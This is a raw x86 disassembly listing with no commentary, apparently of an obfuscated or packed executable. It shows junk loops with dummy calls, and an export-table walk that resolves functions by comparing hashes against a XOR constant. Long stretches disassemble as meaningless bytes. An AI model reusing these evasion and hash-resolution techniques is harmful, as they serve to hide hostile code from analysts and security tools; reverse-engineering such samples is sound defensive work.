  40ce72:	mov    DWORD PTR ds:0x4302bd,0x17
  40ce7c:	cmp    DWORD PTR ds:0x4302bd,0x0
  40ce83:	je     0x40cf64
  40ce89:	cmp    DWORD PTR ds:0x4302bd,0x5
  40ce90:	jne    0x40ced0
  40ce96:	push   0x56ae
  40ce9b:	push   DWORD PTR [ebp-0x28]
  40ce9e:	push   0x17dc
  40cea3:	push   0x51d4
  40cea8:	push   DWORD PTR [ebp-0x28]
  40ceab:	push   0x8ee9
  40ceb0:	push   DWORD PTR [ebp-0x1c]
  40ceb3:	push   0x10f5
  40ceb8:	push   DWORD PTR [ebp-0x18]
  40cebb:	push   0x42e65c
  40cec0:	push   0x42e763
  40cec5:	push   0x4a36
  40ceca:	call   DWORD PTR ds:0x42eac3
  40ced0:	cmp    DWORD PTR ds:0x4302bd,0x6
  40ced7:	jne    0x40ceea
  40cedd:	mov    edi,DWORD PTR ds:0x4302bd
  40cee3:	dec    edi
  40cee4:	mov    DWORD PTR ds:0x4302bd,edi
  40ceea:	mov    edi,DWORD PTR ds:0x4302bd
  40cef0:	dec    edi
  40cef1:	mov    DWORD PTR ds:0x4302bd,edi
  40cef7:	jmp    0x40ce7c
  40cefc:	mov    DWORD PTR ds:0x42e654,0x14
  40cf06:	cmp    DWORD PTR ds:0x42e654,0x0
  40cf0d:	je     0x40cf64
  40cf13:	cmp    DWORD PTR ds:0x42e654,0x5
  40cf1a:	jne    0x40cf36
  40cf20:	push   DWORD PTR [ebp-0x28]
  40cf23:	push   0x4302cd
  40cf28:	push   DWORD PTR [ebp-0x24]
  40cf2b:	push   0x3dba
  40cf30:	call   DWORD PTR ds:0x42eac7
  40cf36:	cmp    DWORD PTR ds:0x42e654,0x6
  40cf3d:	jne    0x40cf50
  40cf43:	mov    esi,DWORD PTR ds:0x42e654
  40cf49:	dec    esi
  40cf4a:	mov    DWORD PTR ds:0x42e654,esi
  40cf50:	mov    esi,DWORD PTR ds:0x42e654
  40cf56:	dec    esi
  40cf57:	mov    DWORD PTR ds:0x42e654,esi
  40cf5d:	jmp    0x40cf06
  40cf62:	add    edi,ecx
  40cf64:	mov    ecx,DWORD PTR [ebp+0x14]
  40cf67:	xor    DWORD PTR ds:0x42ec6f,0x2c6d
  40cf71:	mov    ecx,DWORD PTR [ecx]
  40cf73:	movzx  edi,BYTE PTR ds:0x42e644
  40cf7a:	sbb    DWORD PTR ds:0x4302b5,edi
  40cf80:	mov    DWORD PTR [ebp-0x1c],ecx
  40cf83:	imul   edx,eax
  40cf86:	mov    ecx,0x4573
  40cf8b:	mov    DWORD PTR ds:0x43035b,0x1f
  40cf95:	cmp    DWORD PTR ds:0x43035b,0x0
  40cf9c:	je     0x40cfed
  40cfa2:	cmp    DWORD PTR ds:0x43035b,0x9
  40cfa9:	jne    0x40cfbd
  40cfaf:	push   0x42ec5b
  40cfb4:	push   DWORD PTR [ebp-0x1c]
  40cfb7:	call   DWORD PTR ds:0x42e88f
  40cfbd:	cmp    DWORD PTR ds:0x43035b,0xa
  40cfc4:	jne    0x40cfd7
  40cfca:	mov    esi,DWORD PTR ds:0x43035b
  40cfd0:	dec    esi
  40cfd1:	mov    DWORD PTR ds:0x43035b,esi
  40cfd7:	xor    esi,esi
  40cfd9:	or     esi,DWORD PTR ds:0x43035b
  40cfdf:	dec    esi
  40cfe0:	mov    DWORD PTR ds:0x43035b,esi
  40cfe6:	jmp    0x40cf95
  40cfeb:	add    esi,edi
  40cfed:	add    edx,ecx
  40cfef:	mov    DWORD PTR ds:0x42ec73,0x11
  40cff9:	cmp    DWORD PTR ds:0x42ec73,0x0
  40d000:	je     0x40d094
  40d006:	cmp    DWORD PTR ds:0x42ec73,0x3
  40d00d:	jne    0x40d024
  40d013:	push   DWORD PTR [ebp-0x18]
  40d016:	push   0x42e658
  40d01b:	push   DWORD PTR [ebp-0x18]
  40d01e:	call   DWORD PTR ds:0x42eacb
  40d024:	cmp    DWORD PTR ds:0x42ec73,0x4
  40d02b:	jne    0x40d03e
  40d031:	mov    esi,DWORD PTR ds:0x42ec73
  40d037:	dec    esi
  40d038:	mov    DWORD PTR ds:0x42ec73,esi
  40d03e:	mov    esi,DWORD PTR ds:0x42ec73
  40d044:	dec    esi
  40d045:	mov    DWORD PTR ds:0x42ec73,esi
  40d04b:	jmp    0x40cff9
  40d050:	and    DWORD PTR ds:0x4302b9,0x0
  40d05a:	mov    esi,DWORD PTR ds:0x4302b9
  40d060:	inc    esi
  40d061:	mov    DWORD PTR ds:0x4302b9,esi
  40d067:	cmp    DWORD PTR ds:0x4302b9,0x23
  40d06e:	jne    0x40d087
  40d074:	push   0x4365
  40d079:	push   0x641d
  40d07e:	push   DWORD PTR [ebp-0xc]
  40d081:	call   DWORD PTR ds:0x42e893
  40d087:	cmp    DWORD PTR ds:0x4302b9,0x19
  40d08e:	jb     0x40d05a
  40d094:	mov    esi,0x7879
  40d099:	mov    edi,DWORD PTR ds:0x42ec5b
  40d09f:	sub    DWORD PTR ds:0x42e63c,edi
  40d0a5:	mov    edi,0x1556
  40d0aa:	xchg   esi,ecx
  40d0ac:	mov    ecx,DWORD PTR ds:0x42ec5f
  40d0b2:	xor    DWORD PTR ds:0x42ec67,ecx
  40d0b8:	sub    edx,edi
  40d0ba:	xor    esi,esi
  40d0bc:	movzx  ecx,WORD PTR ds:0x42e654
  40d0c3:	or     DWORD PTR ds:0x4302c1,ecx
  40d0c9:	mov    DWORD PTR [ebp-0x28],esi
  40d0cc:	or     ecx,DWORD PTR ds:0x42ec73
  40d0d2:	mov    DWORD PTR [ebp-0x2c],esi
  40d0d5:	sbb    DWORD PTR ds:0x4302cd,ebx
  40d0db:	mov    DWORD PTR [ebp-0x14],esi
  40d0de:	or     DWORD PTR ds:0x42ec5b,ebx
  40d0e4:	mov    DWORD PTR [ebp-0x8],esi
  40d0e7:	mov    ecx,DWORD PTR ds:0x43036b
  40d0ed:	xor    DWORD PTR ds:0x42ec5f,ecx
  40d0f3:	mov    ecx,DWORD PTR [ebp-0x18]
  40d0f6:	xor    ecx,eax
  40d0f8:	xor    DWORD PTR ds:0x42ec57,0x70e3
  40d102:	xor    edi,edi
  40d104:	movzx  eax,BYTE PTR ds:0x42ec4f
  40d10b:	or     DWORD PTR ds:0x42ec5b,eax
  40d111:	jmp    0x40d25a
  40d116:	adc    al,0xe1
  40d118:	addr16 jp 0x40d18e
  40d11b:	clc    
  40d11c:	jno    0x40d10f
  40d11e:	inc    ebx
  40d11f:	xor    bl,al
  40d121:	xor    DWORD PTR [edi-0x65857b3],edx
  40d127:	cmp    DWORD PTR [esi+0x7e],0x7e7e7f22
  40d12e:	(bad)  
  40d12f:	xchg   DWORD PTR [ebx-0x3682f0da],ecx
  40d135:	adc    eax,0x7795c6a6
  40d13a:	add    bh,BYTE PTR [esi+0xf]
  40d13d:	jg     0x40d108
  40d13f:	(bad)  
  40d140:	fisub  DWORD PTR [edx+eiz*4-0x54]
  40d144:	retf   0x77ea
  40d147:	nop
  40d148:	mov    al,ds:0x5dcfcef3
  40d14d:	ds xchg ecx,eax
  40d14f:	imul   esi,DWORD PTR [edx-0x1b],0xd
  40d153:	mov    ebx,0xd3304de8
  40d158:	xchg   DWORD PTR [ebx],esi
  40d15a:	jae    0x40d15f
  40d15c:	aam    0xed
  40d15e:	sbb    ecx,DWORD PTR [ebx+esi*1-0x365039e9]
  40d165:	(bad)  
  40d166:	stos   DWORD PTR es:[edi],eax
  40d167:	popa   
  40d168:	mov    WORD PTR [ebx-0x10ee3ad3],?
  40d16e:	fs call 0x67e54f76
  40d174:	mov    eax,0x547a0dd9
  40d179:	ins    DWORD PTR es:[edi],dx
  40d17a:	(bad)
  40d17e:	pop    esi
  40d17f:	inc    edx
  40d180:	adc    ebx,DWORD PTR [ebx+edi*4]
  40d183:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d184:	scas   eax,DWORD PTR es:[edi]
  40d185:	(bad)  
  40d186:	retf   
  40d187:	sub    DWORD PTR [eax+0xe259a19],edi
  40d18d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d18e:	sub    dh,dl
  40d190:	mov    esp,0x999f2855
  40d195:	dec    esp
  40d196:	mov    dh,0x83
  40d198:	xchg   edi,eax
  40d199:	test   BYTE PTR [esi*8+0xb030e03],dh
  40d1a0:	cmp    bl,BYTE PTR [ebp-0x42fae16f]
  40d1a6:	test   eax,0xc63cda2c
  40d1ab:	out    dx,eax
  40d1ac:	sub    dh,BYTE PTR [edx-0x5bb4783a]
  40d1b2:	sbb    BYTE PTR [eax+ebp*4+0x5a],cl
  40d1b6:	dec    ecx
  40d1b7:	mov    ah,0xfe
  40d1b9:	aas    
  40d1ba:	cmp    ax,bp
  40d1bd:	mov    edx,0xacc5d51a
  40d1c2:	pop    esp
  40d1c3:	adc    bl,BYTE PTR [edx+eax*1+0x60]
  40d1c7:	pop    eax
  40d1c8:	push   cs
  40d1c9:	jmp    0xea447d57
  40d1ce:	data16 or al,0x54
  40d1d1:	cmp    eax,0x512e5bb5
  40d1d6:	js     0x40d1ad
  40d1d8:	(bad)  [esi-0x3a130dc3]
  40d1de:	imul   esp,esi,0xcca432fc
  40d1e4:	cmc    
  40d1e5:	mov    cl,0x9b
  40d1e7:	(bad)  
  40d1e8:	(bad)  
  40d1e9:	pop    ebx
  40d1ea:	sub    bh,dl
  40d1ec:	mov    al,ds:0x96b8ab2
  40d1f1:	rcr    DWORD PTR ds:0xb99a5339,cl
  40d1f7:	mov    gs,WORD PTR [ebp-0x3c89e642]
  40d1fd:	and    ecx,esi
  40d1ff:	xchg   edx,eax
  40d200:	into   
  40d201:	push   ebx
  40d202:	not    BYTE PTR [eax]
  40d204:	clc    
  40d205:	jne    0x40d191
  40d207:	fcom   DWORD PTR [ebx]
  40d209:	lahf   
  40d20a:	cmp    esp,DWORD PTR [ebp-0x9d86971]
  40d210:	loopne 0x40d203
  40d212:	mov    WORD PTR [edx],ds
  40d214:	sbb    BYTE PTR [ebp+edi*2+0x207d6bdd],dl
  40d21b:	jmp    0x40d1b2
  40d21d:	lock fstp DWORD PTR [ecx-0x30]
  40d221:	dec    DWORD PTR [esi]
  40d223:	adc    ecx,DWORD PTR [edx+0x72263b15]
  40d229:	mov    DWORD PTR [edx+edx*8],eax
  40d22c:	add    BYTE PTR [eax-0x11],ch
  40d22f:	sub    al,0x1a
  40d231:	sub    al,0x82
  40d233:	pop    es
  40d234:	std    
  40d235:	fcmove st,st(7)
  40d237:	xor    BYTE PTR [ebx-0x60],0x7f
  40d23b:	stos   DWORD PTR es:[edi],eax
  40d23c:	pushf  
  40d23d:	inc    edx
  40d23e:	cmp    al,dh
  40d240:	inc    ebp
  40d241:	mov    DWORD PTR [ecx],0x4f4c9ce0
  40d247:	and    esp,ebp
  40d249:	mov    eax,DWORD PTR [esi-0x68]
  40d24c:	cwde   
  40d24d:	jo     0x40d286
  40d24f:	inc    eax
  40d250:	mov    dh,0x34
  40d252:	sub    eax,0x29c972e6
  40d257:	mov    eax,ds:0xcb0360fd
  40d25c:	mov    DWORD PTR [ebp-0x20],ecx
  40d25f:	mov    eax,ds:0x430367
  40d264:	mov    eax,DWORD PTR [ebp-0x20]
  40d267:	je     0x40d591
  40d26d:	mov    eax,DWORD PTR [ebp-0x4]
  40d270:	and    DWORD PTR ds:0x42ec67,0x42e644
  40d27a:	xor    eax,0x7510854
  40d27f:	or     DWORD PTR ds:0x42ec6f,0x3ff6
  40d289:	add    eax,ebx
  40d28b:	mov    DWORD PTR ds:0x42ec5f,0x774f
  40d295:	cmp    edi,eax
  40d297:	mov    DWORD PTR ds:0x42ec57,0x9b6
  40d2a1:	jne    0x40d3eb
  40d2a7:	push   DWORD PTR [ebp+0x8]
  40d2aa:	sub    DWORD PTR ds:0x4302b9,0x4302c5
  40d2b4:	call   0x40cbbb
  40d2b9:	mov    ecx,DWORD PTR ds:0x43035f
  40d2bf:	add    DWORD PTR ds:0x42ec57,ecx
  40d2c5:	mov    DWORD PTR [ebp-0x20],eax
  40d2c8:	add    ecx,ecx
  40d2ca:	mov    eax,DWORD PTR [ebp-0x4]
  40d2cd:	mov    ecx,DWORD PTR [ebp-0x20]
  40d2d0:	mov    esi,DWORD PTR ds:0x42e7ef
  40d2d6:	mov    esi,DWORD PTR [esi]
  40d2d8:	and    DWORD PTR ds:0x4302e5,esi
  40d2de:	mov    esi,0x7510854
  40d2e3:	sub    DWORD PTR ds:0x4302dd,0x42ec53
  40d2ed:	xor    eax,esi
  40d2ef:	add    eax,ebx
  40d2f1:	mov    DWORD PTR ds:0x42e644,0x6de1
  40d2fb:	cmp    ecx,eax
  40d2fd:	mov    DWORD PTR ds:0x4302c9,0x4fd
  40d307:	je     0x40d575
  40d30d:	sbb    DWORD PTR ds:0x4302e5,0x4302bd
  40d317:	push   DWORD PTR [ebp-0x20]
  40d31a:	push   DWORD PTR [ebp+0x8]
  40d31d:	mov    DWORD PTR ds:0x42e644,0x2d65
  40d327:	call   0x4041b8
  40d32c:	xor    DWORD PTR ds:0x42ec6b,0x6710
  40d336:	mov    DWORD PTR [ebp-0x14],eax
  40d339:	or     DWORD PTR ds:0x4302c9,0x430353
  40d343:	mov    eax,DWORD PTR [ebp-0x4]
  40d346:	adc    DWORD PTR ds:0x4302b5,0x2fc0
  40d350:	mov    ecx,DWORD PTR [ebp-0x14]
  40d353:	add    DWORD PTR ds:0x4302cd,0x5a83
  40d35d:	xor    eax,esi
  40d35f:	add    eax,ebx
  40d361:	mov    DWORD PTR ds:0x4302e1,0x3b14
  40d36b:	cmp    ecx,eax
  40d36d:	je     0x40d575
  40d373:	mov    eax,DWORD PTR [ebp-0x14]
  40d376:	and    DWORD PTR ds:0x4302dd,0x0
  40d380:	mov    ecx,DWORD PTR ds:0x4302dd
  40d386:	inc    ecx
  40d387:	mov    DWORD PTR ds:0x4302dd,ecx
  40d38d:	cmp    DWORD PTR ds:0x4302dd,0x1d
  40d394:	jne    0x40d3b2
  40d39a:	push   0x4302c1
  40d39f:	push   0x883a
  40d3a4:	push   0x157c
  40d3a9:	push   DWORD PTR [ebp-0x28]
  40d3ac:	call   DWORD PTR ds:0x42e953
  40d3b2:	cmp    DWORD PTR ds:0x4302dd,0x18
  40d3b9:	jb     0x40d380
  40d3bf:	mov    eax,DWORD PTR [eax+0x18]
  40d3c2:	mov    DWORD PTR [ebp-0x20],eax
  40d3c5:	mov    eax,DWORD PTR [ebp-0x14]
  40d3c8:	mov    ecx,DWORD PTR [ebp+0x8]
  40d3cb:	add    ecx,DWORD PTR [eax+0x20]
  40d3ce:	mov    DWORD PTR [ebp-0x28],ecx
  40d3d1:	mov    eax,DWORD PTR [ebp-0x14]
  40d3d4:	mov    ecx,DWORD PTR [ebp+0x8]
  40d3d7:	add    ecx,DWORD PTR [eax+0x24]
  40d3da:	mov    DWORD PTR [ebp-0x2c],ecx
  40d3dd:	mov    eax,DWORD PTR [ebp-0x14]
  40d3e0:	mov    ecx,DWORD PTR [ebp+0x8]
  40d3e3:	add    ecx,DWORD PTR [eax+0x1c]
  40d3e6:	xor    esi,esi
  40d3e8:	mov    DWORD PTR [ebp-0x14],ecx
  40d3eb:	mov    eax,DWORD PTR [ebp-0x28]
  40d3ee:	mov    ecx,DWORD PTR [ebp+0x8]
  40d3f1:	add    ecx,DWORD PTR [eax+edi*4]
  40d3f4:	lea    eax,[ebp-0x8]
  40d3f7:	mov    DWORD PTR [ebp-0x30],ecx
  40d3fa:	push   eax
  40d3fb:	push   DWORD PTR [ebp-0x30]
  40d3fe:	jmp    0x40d547
  40d403:	add    al,BYTE PTR [ebx]
  40d405:	in     eax,dx
  40d406:	jecxz  0x40d3f5
  40d408:	icebp  
  40d409:	adc    bl,ah
  40d40b:	push   0xdd6a8e30
  40d410:	test   BYTE PTR [ebp+0x7e8eadc1],cl
  40d416:	jle    0x40d43a
  40d418:	jg     0x40d498
  40d41a:	jle    0x40d3d8
  40d41c:	(bad)  
  40d41d:	rcr    BYTE PTR [edi+0x22],1
  40d420:	jg     0x40d40d
  40d422:	iret   
  40d423:	cdq    
  40d424:	scas   al,BYTE PTR es:[edi]
  40d425:	push   0x55595709
  40d42a:	inc    edi
  40d42b:	push   esi
  40d42c:	mov    ?,esi
  40d42e:	jmpw   0x70b
  40d432:	sbb    eax,0x80c4adae
  40d437:	push   eax
  40d438:	fistp  DWORD PTR [ebx]
  40d43a:	and    al,0x59
  40d43c:	es jae 0x40d3fc
  40d43f:	inc    esi
  40d440:	bound  ecx,QWORD PTR [ecx-0x34]
  40d443:	mov    fs,ebx
  40d445:	sub    dh,BYTE PTR [ebp-0x6e]
  40d448:	hlt    
  40d449:	xor    eax,0x78d9fa3d
  40d44e:	sti    
  40d44f:	jbe    0x40d3fd
  40d451:	rol    BYTE PTR [edi+0x13],cl
  40d454:	sbb    edi,esi
  40d456:	cwde   
  40d457:	(bad)  
  40d459:	(bad)  
  40d45a:	jge    0x40d483
  40d45c:	loopne 0x40d47a
  40d45e:	mov    BYTE PTR [ebp+0x7e],dh
  40d461:	push   0xf8d5855c
  40d466:	jb     0x40d3ef
  40d468:	xor    BYTE PTR [eax-0x1a],al
  40d46b:	sub    BYTE PTR [edi-0x6f],al
  40d46e:	pop    edi
  40d46f:	jne    0x40d46c
  40d471:	(bad)  
  40d473:	jns    0x40d498
  40d475:	adc    ebx,ebx
  40d477:	data16 jl 0x40d417
  40d47a:	pop    ds
  40d47b:	sbb    BYTE PTR [esi+0x47],dl
  40d47e:	jnp    0x40d440
  40d480:	or     al,0x75
  40d482:	test   al,0x69
  40d484:	jmp    0x6d2e:0xd028fae2
  40d48b:	sub    dh,BYTE PTR [edi]
  40d48d:	cli    
  40d48e:	cmp    ebp,DWORD PTR [esp+edx*8]
  40d491:	push   ds
  40d492:	push   esi
  40d493:	scas   eax,DWORD PTR es:[edi]
  40d494:	push   0xffffff8b
  40d496:	fild   WORD PTR [esi-0x15]
  40d499:	mov    ds:0x84f06124,eax
  40d49e:	sbb    BYTE PTR [esi+edx*1+0x1e],dl
  40d4a2:	mov    ebx,?
  40d4a4:	push   ds
  40d4a5:	jne    0x40d4d7
  40d4a7:	or     ebp,DWORD PTR [edx+0x20]
  40d4aa:	ins    DWORD PTR es:[edi],dx
  40d4ab:	jp     0x40d51c
  40d4ad:	push   ebp
  40d4ae:	sub    al,0xde
  40d4b0:	add    edi,DWORD PTR [ebp+0x4c79fc7a]
  40d4b6:	and    eax,0x507b6b4d
  40d4bb:	push   ecx
  40d4bc:	mov    dl,0x5e
  40d4be:	test   DWORD PTR [edx],0x561f224f
  40d4c4:	sahf   
  40d4c5:	jmp    0x1bea0527
  40d4ca:	imul   edi,DWORD PTR [edx+0x5a172dcc],0x23abe712
  40d4d4:	pop    ds
  40d4d5:	ja     0x40d4c2
  40d4d7:	aas    
  40d4d8:	sbb    eax,0x54bdb21f
  40d4dd:	jne    0x40d4c3
  40d4df:	push   0xf15875f3
  40d4e4:	mov    edx,0x57fb4341
  40d4e9:	ins    BYTE PTR es:[edi],dx
  40d4ea:	jns    0x40d558
  40d4ec:	fidiv  WORD PTR [edi+edx*2+0x3e0ae9d6]
  40d4f3:	mov    edi,DWORD PTR [edx]
  40d4f5:	call   0x5968:0xc8c64a7d
  40d4fc:	out    dx,al
  40d4fd:	xchg   cl,ch
  40d4ff:	ins    DWORD PTR es:[edi],dx
  40d500:	(bad)  
  40d501:	repnz mov ah,0x9e
  40d504:	pop    ebp
  40d505:	sub    eax,0x81075db9
  40d50a:	xor    DWORD PTR [ebx+0x5db9f034],edi
  40d510:	dec    edx
  40d511:	pop    ds
  40d512:	and    esi,eax
  40d514:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d515:	pop    ss
  40d516:	pop    edx
  40d517:	pop    edx
  40d518:	push   ecx
  40d519:	mov    cl,0xe3
  40d51b:	das    
  40d51c:	mov    eax,ds:0x859cbb1
  40d521:	lock jg 0x40d4cf
  40d524:	loope  0x40d56e
  40d526:	mov    edx,0xf1f63667
  40d52b:	xlat   BYTE PTR ds:[ebx]
  40d52c:	in     eax,dx
  40d52d:	jmp    0x40d526
  40d52f:	int3   
  40d530:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d531:	dec    ebp
  40d532:	add    DWORD PTR [ecx+0x6],ecx
  40d535:	mov    ebp,0xb335baaa
  40d53a:	vpaddsw xmm3,xmm5,xmm1
  40d53e:	jbe    0x40d4d5
  40d540:	ret    
  40d541:	call   0xfc82:0xe908
  40d547:	push   DWORD PTR [ebp+0xc]
  40d54a:	call   0x402e68
  40d54f:	mov    eax,DWORD PTR [ebp-0x4]
  40d552:	mov    ecx,DWORD PTR [ebp-0x8]
  40d555:	xor    eax,0x7510854
  40d55a:	add    eax,ebx
  40d55c:	cmp    ecx,eax
  40d55e:	jne    0x40d581
  40d564:	mov    eax,DWORD PTR [ebp-0x20]
  40d567:	inc    edi
  40d568:	cmp    edi,eax
  40d56a:	jb     0x40d26d
  40d570:	jmp    0x40d591
  40d575:	mov    eax,DWORD PTR [ebp-0x4]
  40d578:	xor    eax,esi
  40d57a:	add    eax,ebx
  40d57c:	jmp    0x40dfde
  40d581:	mov    eax,DWORD PTR [ebp-0x2c]
  40d584:	movzx  eax,WORD PTR [eax+edi*2]
  40d588:	mov    ecx,DWORD PTR [ebp-0x14]
  40d58b:	mov    eax,DWORD PTR [ecx+eax*4]
  40d58e:	mov    DWORD PTR [ebp+0xc],eax
  40d591:	mov    eax,DWORD PTR [ebp-0x4]
  40d594:	mov    ecx,DWORD PTR [ebp-0x8]
  40d597:	xor    eax,0x7510854
  40d59c:	add    eax,ebx
  40d59e:	cmp    ecx,eax
  40d5a0:	jne    0x40d6fc
  40d5a6:	jmp    0x40d6ef
  40d5ab:	aad    0x5b
  40d5ad:	fstp   DWORD PTR [ecx+0x73559971]
  40d5b3:	push   0x64
  40d5b5:	fsin   
  40d5b7:	(bad)  
  40d5b8:	into   
  40d5b9:	repnz mov DWORD PTR [ecx-0x71],edx
  40d5bd:	jle    0x40d63d
  40d5bf:	and    bh,BYTE PTR [edi+0x7e]
  40d5c2:	jle    0x40d5a6
  40d5c4:	ins    DWORD PTR es:[edi],dx
  40d5c5:	sub    dl,BYTE PTR [eax-0x3e3ce4c6]
  40d5cb:	test   eax,0xcfaa1ba3
  40d5d0:	loop   0x40d619
  40d5d2:	ror    DWORD PTR [edx-0x590c5660],0x3b
  40d5d9:	adc    eax,0x89cda8fa
  40d5de:	pop    ecx
  40d5df:	outs   dx,BYTE PTR ds:[esi]
  40d5e0:	mov    BYTE PTR [ecx-0x4f],dh
  40d5e3:	rcr    DWORD PTR [eax-0x6c],cl
  40d5e6:	jmp    0xb51d:0x7d13d451
  40d5ed:	sbb    bh,dh
  40d5ef:	push   0x96c0acac
  40d5f4:	aad    0x47
  40d5f6:	cwde   
  40d5f7:	jecxz  0x40d5fd
  40d5f9:	xchg   DWORD PTR [edi-0xc],ebx
  40d5fc:	jle    0x40d642
  40d5fe:	sub    BYTE PTR [eax-0x18],ch
  40d601:	pop    ds
  40d602:	xchg   ebp,eax
  40d603:	leave  
  40d604:	push   ss
  40d605:	and    edx,DWORD PTR [eax-0x50]
  40d608:	jo     0x40d62e
  40d60a:	ror    DWORD PTR [edx-0x19c3bc48],0x89
  40d611:	adc    BYTE PTR [ebx+0x15],ch
  40d614:	sub    al,BYTE PTR [ecx]
  40d616:	cmp    DWORD PTR [ecx],esp
  40d618:	sbb    BYTE PTR [esi+0x47],bh
  40d61b:	and    eax,0xa9a18d89
  40d620:	add    BYTE PTR [ecx+0x2c],dl
  40d623:	and    dh,BYTE PTR [esi+0x62ea5dbb]
  40d629:	mov    eax,0x1c0cebad
  40d62e:	rol    eax,1
  40d630:	cld    
  40d631:	and    bl,ah
  40d633:	repz add esi,esp
  40d636:	inc    edx
  40d637:	gs aam 0x21
  40d63a:	call   0x43bb:0xb2dd02ab
  40d641:	popf   
  40d642:	mov    DWORD PTR [esi-0x5a66e829],ecx
  40d648:	pop    edi
  40d649:	pop    es
  40d64a:	cs pop ss
  40d64c:	sub    BYTE PTR [edi+0x4b3cfe4d],al
  40d652:	xor    al,0x41
  40d654:	adc    al,0x8
  40d656:	ja     0x40d611
  40d658:	arpl   WORD PTR [eax+0x4a],di
  40d65b:	repnz gs in al,0xe6
  40d65f:	or     eax,DWORD PTR [ecx-0x71d9ae02]
  40d665:	jbe    0x40d6a4
  40d667:	in     al,0x2
  40d669:	push   ecx
  40d66a:	sub    eax,0x192248cf
  40d66f:	sbb    al,0xda
  40d671:	sbb    ch,BYTE PTR fs:[ebx+0x1711428f]
  40d678:	(bad)  
  40d679:	call   0x2651823b
  40d67e:	xchg   bl,ah
  40d680:	(bad)  
  40d681:	cdq    
  40d682:	push   edi
  40d683:	push   ecx
  40d684:	out    0xf,al
  40d686:	aad    0x4e
  40d688:	lock pop bx
  40d68b:	xor    esi,DWORD PTR [ebx+0x44]
  40d68e:	dec    ebx
  40d68f:	shr    esp,cl
  40d691:	add    edx,DWORD PTR ds:0xf2e4b4dc
  40d697:	test   al,0xf0
  40d699:	push   esi
  40d69a:	mov    ecx,0xdf04cf73
  40d69f:	xor    bh,BYTE PTR [edx*4-0x6b9fe56b]
  40d6a6:	repz dec ebp
  40d6a8:	and    eax,0x66b39ca
  40d6ad:	(bad)  
  40d6ae:	mov    cl,0x76
  40d6b0:	mov    eax,ds:0xfe900237
  40d6b5:	add    dl,dh
  40d6b7:	adc    ah,ah
  40d6b9:	inc    edx
  40d6ba:	iret   
  40d6bb:	jmp    0x40d64f
  40d6bd:	mov    al,0xcf
  40d6bf:	lods   al,BYTE PTR ds:[esi]
  40d6c0:	cdq    
  40d6c1:	jle    0x40d6bd
  40d6c3:	jbe    0x40d667
  40d6c5:	pop    ebp
  40d6c6:	xor    ah,BYTE PTR [ebx-0x15]
  40d6c9:	(bad)  
  40d6ca:	mov    esp,ds
  40d6cc:	xor    BYTE PTR [edi-0x3dc427bd],ah
  40d6d2:	mov    ebx,0x363beaba
  40d6d7:	inc    edi
  40d6d8:	cmp    edx,edi
  40d6da:	std    
  40d6db:	pop    edi
  40d6dc:	cmp    BYTE PTR [edx+0x2dfac98e],ch
  40d6e2:	mov    ch,0xc8
  40d6e4:	cmp    ebp,DWORD PTR [eax-0x14b195a5]
  40d6ea:	icebp  
  40d6eb:	and    edi,ebp
  40d6ed:	test   BYTE PTR [ecx],dl
  40d6ef:	mov    eax,DWORD PTR [ebp-0x4]
  40d6f2:	xor    eax,0x7510854
  40d6f7:	jmp    0x40d57a
  40d6fc:	mov    eax,DWORD PTR [ebp+0xc]
  40d6ff:	add    eax,DWORD PTR [ebp+0x8]
  40d702:	mov    DWORD PTR [ebp-0x10],eax
  40d705:	mov    eax,DWORD PTR [ebp-0x1c]
  40d708:	test   eax,eax
  40d70a:	je     0x40de47
  40d710:	mov    DWORD PTR [ebp-0x24],esi
  40d713:	push   0xb
  40d715:	jmp    0x40d85e
  40d71a:	dec    esi
  40d71b:	(bad)  
  40d71c:	xchg   ebx,eax
  40d71d:	mov    bh,0x93
  40d71f:	jae    0x40d78b
  40d721:	out    0x84,eax
  40d723:	push   ss
  40d724:	(bad)  
  40d725:	mov    WORD PTR [eax+0x59c4002],cs
  40d72b:	lea    edi,[esi+0x7e]
  40d72e:	and    bh,BYTE PTR [edi+0x7e]
  40d731:	jle    0x40d781
  40d733:	cs stc 
  40d735:	lods   al,BYTE PTR ds:[esi]
  40d736:	jmp    DWORD PTR [edi+0x73]
  40d739:	outs   dx,DWORD PTR ds:[esi]
  40d73a:	sar    BYTE PTR [eax+0x42dfbcaa],0x29
  40d741:	dec    ebp
  40d742:	ret    0xf9ae
  40d745:	cs dec ebx
  40d747:	and    DWORD PTR [ecx-0x1f],eax
  40d74a:	stc    
  40d74b:	mov    ebx,0x408f18d2
  40d750:	into   
  40d751:	mov    WORD PTR [edi+0x10],?
  40d754:	pop    edi
  40d755:	add    al,0x37
  40d757:	sub    BYTE PTR [esi+0x59],0xea
  40d75b:	popf   
  40d75c:	(bad)  ds:0x1e090e97
  40d762:	sahf   
  40d763:	xchg   DWORD PTR [edi-0xd],esp
  40d766:	fs out 0xc6,al
  40d769:	mov    ch,0x9f
  40d76b:	mov    bh,0xad
  40d76d:	cdq    
  40d76e:	cmp    BYTE PTR [edx],ah
  40d770:	lock pushf 
  40d772:	call   DWORD PTR [ebp+0x783aefbe]
  40d778:	adc    DWORD PTR [edx-0xe],edx
  40d77b:	cmp    eax,0xed91bbff
  40d780:	cmp    ecx,DWORD PTR [ebx+0x45]
  40d783:	cmp    BYTE PTR [esi],bl
  40d785:	mov    ds:0xb50b4c24,eax
  40d78a:	mov    BYTE PTR [edi+0xd4057e4],dh
  40d790:	sbb    DWORD PTR [ebx+0x6c],0x0
  40d794:	xlat   BYTE PTR ds:[ebx]
  40d795:	push   edi
  40d796:	or     BYTE PTR [ecx+0x55],0xd2
  40d79a:	sub    eax,0x8aa402a0
  40d7a0:	and    BYTE PTR [ebx],bl
  40d7a2:	iret   
  40d7a3:	xchg   ecx,eax
  40d7a4:	mov    ch,0x8c
  40d7a6:	mov    ebp,0x5eedaa13
  40d7ab:	aaa    
  40d7ac:	mov    esp,DWORD PTR [eax]
  40d7ae:	test   BYTE PTR [esi+0x874a787],0xa7
  40d7b5:	push   es
  40d7b6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d7b7:	adc    DWORD PTR [edi-0x46],ecx
  40d7ba:	lods   eax,DWORD PTR ds:[esi]
  40d7bb:	mov    ss,WORD PTR [edx+0xf]
  40d7be:	(bad)  
  40d7bf:	push   esp
  40d7c0:	jmp    0x86f2:0x3a3ef32
